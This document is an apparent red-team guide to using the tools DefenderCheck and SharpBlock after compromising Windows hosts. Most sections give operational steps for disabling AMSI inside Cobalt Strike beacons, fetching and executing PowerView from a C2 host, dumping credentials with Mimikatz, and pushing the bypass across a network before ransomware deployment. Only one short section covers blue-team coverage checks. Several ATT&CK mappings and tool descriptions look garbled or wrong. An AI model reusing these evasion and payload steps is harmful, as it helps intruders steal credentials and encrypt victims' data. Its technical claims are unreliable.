# DefenderCheck-SharpBlock: Hands-On Use Cases

## DefenderCheck: Initial Post-Exploitation Reconnaissance

**MITRE ATT&CK:** T1592.001 (Gather Victim Host Information / Hardware), T1518.001 (Software Discovery), T1087.001 (Account Discovery / Local Accounts)

You have shell access on a compromised workstation. Before deploying further payloads, you need to know what EDR/AV is running to choose evasion techniques.

```powershell
# Obtain DefenderCheck.exe on target (e.g., via SMB share, downloaded from C2 server, etc.)
# For this example, assume DefenderCheck.exe is staged in C:\Temp\

C:\Temp\DefenderCheck.exe
```

**Output Example:**
```
[*] Found Windows Defender engine
[*] Antivirus Product State:  : "Enabled"
[*] Antivirus Service Running : "Yes"
[*] Windows Defender samples directory found at C:\ProgramData\Microsoft\Windows Defender

[*] Scanning for third-party antivirus...
[*] [!] Found Carbon Black Response
[*] [!] Service Running: cbsensor (cbsensor.exe)
```

**Interpretation:** Defender is running *and* Carbon Black endpoint protection is active. Conclusion: unencoded PowerShell and unsigned binaries have high detection risk. Decision: use SharpBlock to disable AMSI, or load all further tooling through the C2 beacon's already-patched CLR host.

---

## DefenderCheck: Red-Team Fleet Assessment

**MITRE ATT&CK:** T1087.001 (Account Discovery), T1518 (Software Discovery), T1654 (Log Enumeration)

As part of a red-team assessment, you are scanning a corporate network to build an inventory of which departments have deployed endpoint detection and response vs. legacy antivirus. Run DefenderCheck on each compromised machine and aggregate the results.

```powershell
# On attacker's analysis machine, execute across multiple targets via psexec/wmiexec/etc.

# Via Impacket wmiexec.py:
python3 wmiexec.py DOMAIN/user:pass@10.0.1.100 cmd.exe /c "C:\Temp\DefenderCheck.exe"

# Repeat for each target; aggregate output into CSV via PowerShell or external script
```

**Interpretation:** You now have a map of security posture variations. High-EDR departments → C2 infrastructure rewritten to be stealthier. Undefended departments → standard toolkit. This informs the cost/benefit of different techniques across the organization.

---

## SharpBlock: Disable AMSI Before Running PowerShell Enumeration

**MITRE ATT&CK:** T1562.001 (Impair Defenses / Disable or Modify Tools), T1059.001 (Command and Scripting Interpreter / PowerShell)

You have a Cobalt Strike beacon running on a workstation with Defender + an EDR agent. You want to run an offensive PowerShell script (e.g., PowerView/Get-ADComputer) to enumerate the domain. Standard PowerShell invocation will be caught by AMSI/EDR. Solution: use SharpBlock to patch AMSI first.

```csharp
// Compile SharpBlock.exe from source (or use pre-compiled variant from beacon teamserver)
// Inside Cobalt Strike beacon:

beacon> shell C:\Temp\SharpBlock.exe
[*] AMSI Patch successful

beacon> powershell "IEX(New-Object Net.WebClient).DownloadString('http://c2.internal/PowerView.ps1'); Get-ADComputer -Properties * | select name,operatingSystem"
[*] AMSI bypassed; enumeration completes without AV/EDR notice
```

**Mechanics:** SharpBlock patches AMSI.dll in the current PowerShell.exe process's memory. Subsequent script execution (via IEX, -NoProfile, -ExecutionPolicy Bypass, etc.) bypasses AMSI checks. The patching is permanent for that process lifetime.

---

## SharpBlock: Inject Into PowerShell and Bypass Before Script Execution

**MITRE ATT&CK:** T1562.001 (Impair Defenses), T1059.001 (PowerShell), T1134.003 (Process Injection / Child Process)

Instead of running SharpBlock as a separate child process (which adds a detection artifact), inject it directly into the PowerShell process *before* you execute the offensive script.

```powershell
# Via C# inline execution within beacon or Sliver:

beacon> csharp_execute /path/to/SharpBlock.cs
[*] Executed: AMSI patched in current context

# Now execute payload inline (no child process spawned for SharpBlock itself)
beacon> powershell "Invoke-Mimikatz -Command 'sekurlsa::logonpasswords'"
```

**Advantage:** No child process means no Sysmon 1 (process creation) event showing SharpBlock.exe. The AMSI patch is applied invisibly within the existing beacon/scripting context.

---

## DefenderCheck: Blue-Team Verification—Ensuring AV Coverage Across Endpoints

**MITRE ATT&CK:** T1518.001 (Software Discovery) — **legitimate use case**

A blue-team operator runs DefenderCheck as part of a quarterly health-check to verify all managed endpoints have Defender or approved third-party EDR enabled.

```powershell
# Deploy via Intune/Group Policy or endpoint-management platform:

# PowerShell script pushes DefenderCheck.exe to all machines and executes it
$machines = @("PC001", "PC002", "PC003", ...)
foreach ($machine in $machines) {
    $result = & "\\$machine\C$\Temp\DefenderCheck.exe" 2>&1
    if ($result -like "*Found*") {
        [pscustomobject]@{
            Machine = $machine
            Result  = $result
        }
    } else {
        Write-Warning "No AV found on $machine"
    }
}
```

**Outcome:** List of machines missing security products; remediation triggered.

---

## SharpBlock: Bypass AMSI During C# Malware Execution via Beacon

**MITRE ATT&CK:** T1562.001 (Impair Defenses), T1027 (Obfuscation or Encoding), T1218 (Signed Binary Proxy Execution)

Your Cobalt Strike beacon is running on a workstation. You want to execute a custom C# malware assembly (e.g., SharpUp for privilege escalation discovery) but AMSI is blocking it at load time. Patch AMSI first.

```bash
# Operator's machine (Cobalt Strike teamserver):

# Load SharpBlock into memory (pre-compiled or on-demand compiled)
beacon> shell C:\Temp\SharpBlock.exe

# Now load the target assembly (e.g., custom SharpUp variant) without AMSI interception
beacon> csharp_execute /path/to/SharpUp.cs
beacon> SharpUp
```

**Result:** SharpUp runs and completes enumeration without AMSI/EDR blocking the assembly load.

---

## DefenderCheck: Trigger During Payload Staging Decision

**MITRE ATT&CK:** T1592.001 (Gather Victim Information), T1566 (Phishing)

An attacker has delivered an initial payload (macro, HTA, etc.) and gained code execution. Before deciding whether to stage a fully-featured toolset or a minimal stager, check what's running.

```vbscript
' Within Office macro or HTA:
Set objWMI = GetObject("winmgmts:")
Set objItems = objWMI.ExecQuery("Select * from Win32_Product WHERE Name LIKE '%Defender%'")
If objItems.Count > 0 Then
    MsgBox "Defender found - use minimal stager"
Else
    MsgBox "No Defender - safe for full toolkit"
End If
```

**Interpretation:** Script-based reconnaissance, no external tool needed (built into Windows). Attacker now knows which payload pathway to use.

---

## SharpBlock: Mass AMSI Disabling for Ransomware Deployment

**MITRE ATT&CK:** T1562.001 (Impair Defenses), T1486 (Data Encrypted for Impact), T1491 (Defacement)

A ransomware operator has compromised a domain controller and gained lateral movement across the network. Before deploying the encryption routine (itself often detected by AMSI/EDR), patch AMSI on all compromised machines to suppress alerts.

```powershell
# Lateral movement + SharpBlock deployment across network:

# Push SharpBlock.exe to shared folder
Copy-Item -Path .\SharpBlock.exe -Destination "\\TARGET\C$\Windows\Temp\sb.exe" -Force

# Trigger remotely via SMBEXEC / WinRM / scheduled task:
Invoke-WmiMethod -Class Win32_Process -Name Create -ArgumentList "C:\Windows\Temp\sb.exe" `
    -ComputerName TARGET -Credential $cred
```

Once SharpBlock runs on all targets, ransomware payload follows without AMSI interference.

---

## SharpBlock: One-Liner Inline Patch (Source-Level)

**MITRE ATT&CK:** T1562.001 (Impair Defenses), T1027 (Obfuscation)

Instead of executing SharpBlock as a separate binary, compile and run it inline within a larger payload or beacon context.

```csharp
// Within a Cobalt Strike aggressor script or custom stager:
[System.Reflection.Assembly]::LoadWithPartialName("System.Security").GetType("System.Security.Cryptography.ProtectedData") | Out-Null

// Inline SharpBlock patch (simplified pseudocode):
$amsi = [Reflection.Assembly]::Load([byte[]][System.IO.File]::ReadAllBytes("C:\Temp\amsi.bin"));
// ... patch amsi.dll methods in-process...

// Now execute payload with AMSI disabled
```

This approach leaves no SharpBlock binary on disk and no child process — only the patched in-memory state.

